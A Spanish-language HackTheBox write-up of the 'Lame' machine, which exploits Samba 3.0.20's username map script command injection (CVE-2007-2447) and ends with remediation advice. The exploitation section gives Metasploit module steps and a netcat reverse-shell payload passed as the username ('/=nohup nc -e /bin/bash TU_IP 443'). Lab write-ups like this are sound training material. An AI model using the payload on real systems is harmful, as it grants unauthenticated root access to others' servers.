Resumen

Lame es la máquina número uno de HackTheBox y un clásico absoluto. No tiene rabbit holes ni nada rebuscado: un Samba antiquísimo con una vulnerabilidad que te deja ejecutar comandos como root directamente, sin pasar por un usuario intermedio ni escalar nada. Se resuelve en cinco minutos, pero enseña de maravilla por qué un servicio sin actualizar es una sentencia.

Vulnerabilidad

CVE-2007-2447 (Samba — username map script)

Es una inyección de comandos en Samba 3.0.20. Cuando en la configuración está activa la opción username map script, Samba coge el nombre de usuario que mandas en el login y lo pasa sin sanear a una shell del sistema. Si en lugar de un nombre normal envías algo como "/=comando", ese comando se ejecuta en el servidor. Y como el demonio de Samba corre como root, el comando también. Todo esto sin necesidad de autenticarse.

Reconocimiento

Lanzamos el escaneo completo de puertos

Llaman la atención tres cosas: un vsftpd 2.3.4 (famoso por su backdoor), un distccd en el 3632 y, sobre todo, un Samba 3.0.20 en los puertos 139/445. Tres posibles caminos.

Enumeración

Afinamos versiones con scripts sobre los puertos de Samba

┌──(jaime㉿kali)-[~]└─$ sudo nmap -p 139,445 -sCV lame
Samba smbd 3.0.20-Debian

El vsftpd 2.3.4 parece el cebo evidente, pero aquí su backdoor no responde (es un callejón sin salida). El distcc (CVE-2004-2687) también daría ejecución, pero como usuario sin privilegios. La vía limpia y directa es el Samba 3.0.20: esa versión es vulnerable al username map script (CVE-2007-2447) y nos da root de una. Lo confirmamos con searchsploit samba 3.0.20.

Explotación

La forma más cómoda es con Metasploit, que tiene el módulo exacto

┌──(jaime㉿kali)-[~]└─$ msfconsole -q
msf6 > use exploit/multi/samba/usermap_script msf6 > set RHOSTS lame msf6 > set LHOST tun0 msf6 > run

El módulo abre una conexión SMB y, en el campo del nombre de usuario, cuela el payload entre comillas invertidas aprovechando el username map script. Samba lo ejecuta como root y nos devuelve una shell.

Si lo quieres manual, es exactamente la misma idea con smbclient: te pones en escucha y usas como usuario un payload del tipo "/=nohup nc -e /bin/bash TU_IP 443". Al intentar el logon, Samba ejecuta el nc y te llega la reverse shell.

┌──(jaime㉿kali)-[~]└─$ whoami
root

Escalada de privilegios

No hay escalada que hacer: la propia explotación de Samba nos deja ya como root. Es lo que hace a Lame tan directa: el fallo del servicio ejecuta con los privilegios del demonio, que corre como root. Así que vamos directos a por las dos flags.

Flags

┌──(jaime㉿kali)-[~]└─$ cat /home/makis/user.txt
┌──(jaime㉿kali)-[~]└─$ cat /root/root.txt

Cómo se arregla

Todo parte de un servicio obsoleto y una opción peligrosa, así que:

  • Actualizar Samba: la 3.0.25 ya corrige el CVE-2007-2447. Lo ideal es saltar a una rama mantenida.
  • Revisar 'username map script': si no se usa, se desactiva; esa opción es justo el vector del fallo.
  • Dar de baja lo demás: el vsftpd 2.3.4 y el distccd no pintan nada expuestos; menos superficie, menos problemas.
  • Principio de menor privilegio: no ejecutar servicios de cara a la red directamente como root cuando se puede usar una cuenta de servicio limitada.

Conclusiones

Lame es la demostración perfecta de que mantener software sin parchear es jugársela: una versión de Samba con un CVE público desde 2007 permite ejecutar comandos como root sin credenciales.

Enseña también a no obsesionarse con el primer cebo: el vsftpd 2.3.4 llama mucho la atención, pero no siempre el camino evidente es el bueno. Enumerar bien las versiones y tirar de searchsploit te lleva al vector real.
